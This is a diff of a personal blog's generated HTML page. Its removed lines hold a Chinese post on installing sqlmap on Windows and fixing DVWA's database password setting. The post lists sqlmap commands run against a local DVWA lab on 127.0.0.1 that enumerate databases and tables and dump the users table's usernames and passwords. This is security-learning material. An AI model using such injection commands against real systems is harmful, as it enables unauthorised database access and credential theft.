@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Windows下安装sqlmap，以及DVWA搭建的注意事项 · DGZ&#39;s Blog</title>
+    <title>DGZ&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >DGZ&#39;s Blog.</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">Windows下安装sqlmap，以及DVWA搭建的注意事项</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>DGZ's Blog.</a>
 </header>
@@ -231,74 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            Windows下安装sqlmap，以及DVWA搭建的注意事项
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "Web">Web</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">602</span>Reading time: <span class="post-count reading-time">2 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/01/18</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -399,61 +338,47 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <p>首先百度搜索sqlmap，找到<a href="https://github.com/sqlmapproject/sqlmap/" target="_blank" rel="noopener">github</a>的sqlmap，下载zip到本地，解压出来<br>将解压出来的文件放到python2目录下<br><img src="https://raw.githubusercontent.com/DGZ-cyber/Picgo/master/0eca7b06fa861da12f8e063bda2c249.png" alt=""></p>
-<p>之后可以在你方便的地方创建快捷方式，对象位置输入cmd，名称为sqlmap<br><img src="https://raw.githubusercontent.com/DGZ-cyber/Picgo/master/73bf364c933e4e4deaf00854bc90894.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/DGZ-cyber/Picgo/master/9a39000a24845c94eb0e5cdc84cbaa2.png" alt=""></p>
-<p>之后右键属性该快捷方式，修改为放置sqlmap文件的那个位置<br><img src="https://raw.githubusercontent.com/DGZ-cyber/Picgo/master/a144b18047984ccc33f3ecbaf0a8471.png" alt=""><br>就完事了，打开该快捷方式，按照sqlmap的语法输入就可以了</p>
-<p>不过装dvwa碰到一个小坑，我记得我以前在本机上用过dvwa，还装了发现原先安装过wampserver，但是忘了怎么打开的，按照网上修改的方法修改 ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;db_password&apos; ] = &apos;p@ssw0rd&apos;;</span><br></pre></td></tr></table></figure><br>把p@ssw0rd改成空的或者root都发现没用，进去dvwa点击Creat/Reset Database以后提示  Could not connect to MySQL service,please check the config file. Your database user is root,if you are using MariaDB,this will not work,please read the readme.md file</p>
-<p>想起我原本弄过一个小后台，设置过mysql的登陆密码，找到修改的密码，发现是123456，修改一下即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;db_password&apos; ] = &apos;123456&apos;;</span><br></pre></td></tr></table></figure></p>
-<p>用admin及password登录<br><img src="https://raw.githubusercontent.com/DGZ-cyber/Picgo/master/1579328271.jpg" alt=""></p>
-<p>顺便记录一下sqlmap对于get请求的参数的语法，以dvwa中low级别的sql注入板块为例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#对于需要phpsessiid，按F12，在network里刷新一下，找到对应的phpsessiid</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=kphnksohjgr4k8ltcp1a7i2g17&quot; --batch --dbs</span><br><span class="line">#对于不需要phpsessiid的，可直接省略中间那句；--dbms=mysql是已知数据库为mysql，缩短扫描时间</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --dbms=mysql -p id                  </span><br><span class="line">#对变量id检测是否存在注入，以及当前使用的数据库</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=kphnksohjgr4k8ltcp1a7i2g17&quot; --batch --dbms=mysql -p id --current-db </span><br><span class="line">#指定dvwa数据库查库里面的表</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=kphnksohjgr4k8ltcp1a7i2g17&quot; --batch --dbms=mysql -p id --tables -D dvwa </span><br><span class="line">#把users表的列名显示出来</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=kphnksohjgr4k8ltcp1a7i2g17&quot; --batch --dbms=mysql -p id --columns -T users -D dvwa</span><br><span class="line">#把user和password的数据dump下来</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=kphnksohjgr4k8ltcp1a7i2g17&quot; --batch --dbms=mysql -p id --dump -C user,password -T users -D dvwa</span><br></pre></td></tr></table></figure></p>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>Author：<a href="https://dgz-cyber.github.io">DGZ</a>
-            <p>原文链接：<a href="https://dgz-cyber.github.io/2020/01/18/Windows%E4%B8%8B%E5%AE%89%E8%A3%85sqlmap%EF%BC%8C%E4%BB%A5%E5%8F%8ADVWA%E6%90%AD%E5%BB%BA%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">https://dgz-cyber.github.io/2020/01/18/Windows%E4%B8%8B%E5%AE%89%E8%A3%85sqlmap%EF%BC%8C%E4%BB%A5%E5%8F%8ADVWA%E6%90%AD%E5%BB%BA%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</a>
-            <p>发表日期：<a href="https://dgz-cyber.github.io/2020/01/18/Windows%E4%B8%8B%E5%AE%89%E8%A3%85sqlmap%EF%BC%8C%E4%BB%A5%E5%8F%8ADVWA%E6%90%AD%E5%BB%BA%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">January 18th 2020, 2:18:52 pm</a>
-            <p>更新日期：<a href="https://dgz-cyber.github.io/2020/01/18/Windows%E4%B8%8B%E5%AE%89%E8%A3%85sqlmap%EF%BC%8C%E4%BB%A5%E5%8F%8ADVWA%E6%90%AD%E5%BB%BA%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">January 18th 2020, 2:21:13 pm</a>
-            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/01/18/Windows%E4%B8%8B%E5%AE%89%E8%A3%85sqlmap%EF%BC%8C%E4%BB%A5%E5%8F%8ADVWA%E6%90%AD%E5%BB%BA%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/" >
+            
+                <span>Windows下安装sqlmap，以及DVWA搭建的注意事项</span>
+        </a>
+        <div class="abstract-content">
+            首先百度搜索sqlmap，找到github的sqlmap，下载zip到本地，解压出来将解压出来的文件放到python2目录下
+之后可以在你方便的地方创建快捷方式，对象位置输入cmd，名称为sqlmap
+
+之后右键属性该快捷方式，修改为放置sqlmap文件的那个位置就完事了，打开该快捷方式，按照sqlmap的语法输入就可以了
+不过装dvwa碰到一个小坑，我记得我以前在本机上用过dvwa，还装了发现原先安装过wampserver，但是忘了怎么打开的，按照网上修改的方法修改 ：1$_DVWA[ &apos;db_password&apos; ] = &apos;p@ssw0rd&apos;;把...
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/01/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "Web">Web</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2020/02/12/%E3%80%90%E8%AE%B0%E5%BD%95%E3%80%91%E7%91%9E%E5%B9%B8%E7%9C%9F%E6%98%AF%E5%89%B2%E7%BE%8E%E5%9B%BD%E9%9F%AD%E8%8F%9C%EF%BC%8C%E8%A1%A5%E8%B4%B4%E4%B8%AD%E5%9B%BD%E4%BA%BA%E5%96%9D%E5%92%96%E5%95%A1%E5%90%97%EF%BC%9F/" title= "【记录】瑞幸真是割美国韭菜，补贴中国人喝咖啡吗？">
-                    <div class="nextTitle">【记录】瑞幸真是割美国韭菜，补贴中国人喝咖啡吗？</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/12/10/%E5%85%B3%E4%BA%8E%E9%92%A0%E7%A6%BB%E5%AD%90%E7%94%B5%E6%B1%A0%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title= "关于钠离子电池的学习记录">
-                    <div class="prevTitle">关于钠离子电池的学习记录</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
+    <nav class="page-nav">
+        <a class="extend prev" rel="prev" href="/archives/2020/page/3/">&amp;#60; PREV</a><a class="page-number" href="/archives/2020/">1</a><a class="page-number" href="/archives/2020/page/2/">2</a><a class="page-number" href="/archives/2020/page/3/">3</a><span class="page-number current">4</span>
+    </nav>
     
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -538,24 +463,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1466,8 +1373,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     <script type="text/x-mathjax-config">
     MathJax.Hub.Config({
